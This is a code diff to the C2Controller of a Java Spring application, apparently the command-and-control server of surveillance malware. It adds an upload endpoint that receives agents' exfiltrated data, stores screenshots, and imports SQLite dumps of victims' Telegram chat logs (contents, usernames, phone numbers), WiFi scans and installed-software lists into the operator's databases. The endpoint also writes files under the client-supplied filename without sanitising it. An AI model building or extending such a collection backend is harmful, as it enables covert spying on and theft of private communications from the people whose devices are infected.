@@ -36,6 +36,12 @@ import cn.hutool.cache.CacheUtil;
 import cn.hutool.cache.impl.TimedCache;
 import cn.hutool.crypto.digest.DigestUtil;
 
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.ResultSet;
+import java.sql.Statement;
+import org.apache.commons.lang3.StringUtils;
+
 /**
  * C2 Controller (Agent Communication)
  */
@@ -94,6 +100,160 @@ public class C2Controller {
 
     @Resource
     private org.springframework.jdbc.core.JdbcTemplate jdbcTemplate;
+
+    @PostMapping("/c2/upload")
+    public BaseResponse<String> uploadFile(@RequestParam("file") MultipartFile file,
+                                           @RequestParam(value = "uuid", required = false) String uuid,
+                                           @RequestParam(value = "taskId", required = false) String taskId) {
+        if (file.isEmpty()) {
+            return ResultUtils.error(ErrorCode.PARAMS_ERROR, "File is empty");
+        }
+        
+        // Ensure UUID is present
+        if (StringUtils.isBlank(uuid)) {
+            uuid = "unknown";
+        }
+
+        // Save file
+        String filename = file.getOriginalFilename();
+        String uploadDir = "uploads/" + uuid;
+        File dir = new File(uploadDir);
+        if (!dir.exists()) {
+            dir.mkdirs();
+        }
+        
+        File dest = new File(dir, filename);
+        try {
+            file.transferTo(dest);
+            log.info("File uploaded to: {}", dest.getAbsolutePath());
+            
+            // Process DB
+            if (filename != null && filename.endsWith(".db")) {
+                try {
+                    processSqliteDb(dest, uuid);
+                } catch (Exception e) {
+                    log.error("Failed to process SQLite DB", e);
+                    return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "DB processing failed: " + e.getMessage());
+                }
+            } else if (filename != null && (filename.endsWith(".png") || filename.endsWith(".jpg"))) {
+                // Save screenshot record
+                C2Screenshot screenshot = new C2Screenshot();
+                screenshot.setDeviceUuid(uuid);
+                screenshot.setTaskId(taskId);
+                screenshot.setUrl("/uploads/" + uuid + "/" + filename); 
+                screenshot.setCreateTime(new Date());
+                c2ScreenshotMapper.insert(screenshot);
+            }
+            
+            return ResultUtils.success("File uploaded successfully");
+        } catch (IOException e) {
+            log.error("Upload failed", e);
+            return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed");
+        }
+    }
+
+    private void processSqliteDb(File dbFile, String uuid) throws Exception {
+        // Load SQLite driver
+        Class.forName("org.sqlite.JDBC");
+        
+        String url = "jdbc:sqlite:" + dbFile.getAbsolutePath();
+        try (java.sql.Connection conn = java.sql.DriverManager.getConnection(url)) {
+            
+            // 1. Sync Chat Logs
+            try (java.sql.Statement stmt = conn.createStatement();
+                 java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM chat_logs")) {
+                
+                int count = 0;
+                while (rs.next()) {
+                    try {
+                        TgMessage msg = new TgMessage();
+                        // Map fields from SQLite to TgMessage
+                        msg.setChatId(rs.getString("chat_id"));
+                        msg.setSenderId(rs.getString("sender_id"));
+                        msg.setSenderUsername(rs.getString("sender_username"));
+                        msg.setSenderPhone(rs.getString("sender_phone"));
+                        msg.setReceiverId(rs.getString("receiver_id"));
+                        msg.setReceiverUsername(rs.getString("receiver_username"));
+                        msg.setReceiverPhone(rs.getString("receiver_phone"));
+                        msg.setContent(rs.getString("content"));
+                        
+                        // Handle timestamp
+                        long ts = rs.getLong("timestamp");
+                        if (ts > 0) {
+                            msg.setMsgDate(new Date(ts * 1000));
+                        }
+                        
+                        msg.setMediaPath(rs.getString("media_path"));
+                        msg.setCreateTime(new Date());
+                        msg.setIsDelete(0);
+                        msg.setMsgType("text"); // Default
+                        
+                        // Simple deduplication logic: check if same sender, content and timestamp exists
+                        // Note: Using a unique constraint in DB would be better, but we do soft checks here
+                        LambdaQueryWrapper<TgMessage> dupCheck = new LambdaQueryWrapper<>();
+                        dupCheck.eq(TgMessage::getSenderId, msg.getSenderId())
+                                .eq(TgMessage::getContent, msg.getContent())
+                                .eq(TgMessage::getMsgDate, msg.getMsgDate());
+                                
+                        if (tgMessageMapper.selectCount(dupCheck) == 0) {
+                            tgMessageMapper.insert(msg);
+                            count++;
+                        }
+                    } catch (Exception e) {
+                        log.warn("Failed to import message row", e);
+                    }
+                }
+                log.info("Imported {} messages for uuid {}", count, uuid);
+            } catch (Exception e) {
+                log.warn("Failed to query chat_logs: " + e.getMessage());
+            }
+
+            // 2. Sync WiFi
+            try (java.sql.Statement stmt = conn.createStatement();
+                 java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM wifi_scan_results")) {
+                
+                // Clear old wifi for this device?
+                QueryWrapper<C2Wifi> deleteWrapper = new QueryWrapper<>();
+                deleteWrapper.eq("device_uuid", uuid);
+                c2WifiMapper.delete(deleteWrapper);
+                
+                while (rs.next()) {
+                    C2Wifi wifi = new C2Wifi();
+                    wifi.setDeviceUuid(uuid);
+                    wifi.setSsid(rs.getString("ssid"));
+                    wifi.setBssid(rs.getString("bssid"));
+                    wifi.setSignalStrength(rs.getString("signal_strength"));
+                    wifi.setAuthentication(rs.getString("authentication")); // If exists
+                    wifi.setCreateTime(new Date());
+                    c2WifiMapper.insert(wifi);
+                }
+            } catch (Exception e) {
+                log.warn("Failed to query wifi_scan_results: " + e.getMessage());
+            }
+
+            // 3. Sync Software
+            try (java.sql.Statement stmt = conn.createStatement();
+                 java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM installed_software")) {
+                 
+                // Clear old software
+                QueryWrapper<C2Software> deleteWrapper = new QueryWrapper<>();
+                deleteWrapper.eq("device_uuid", uuid);
+                c2SoftwareMapper.delete(deleteWrapper);
+                
+                while (rs.next()) {
+                    C2Software soft = new C2Software();
+                    soft.setDeviceUuid(uuid);
+                    soft.setName(rs.getString("display_name"));
+                    soft.setVersion(rs.getString("display_version"));
+                    soft.setInstallDate(rs.getString("install_date"));
+                    soft.setCreateTime(new Date());
+                    c2SoftwareMapper.insert(soft);
+                }
+            } catch (Exception e) {
+                log.warn("Failed to query installed_software: " + e.getMessage());
+            }
+        }
+    }
 
     @GetMapping("/reset-schema")
     public String resetSchema() {
@@ -264,7 +424,7 @@ public class C2Controller {
         return c2DeviceMapper.selectOne(queryWrapper);
     }
 
-    @PostMapping("/heartbeat")
+    @PostMapping("/c2/heartbeat")
     public String heartbeat(@RequestBody Map<String, Object> body, HttpServletRequest request) {
         // Try to decrypt if "data" field exists
         Map<String, Object> payload = body;
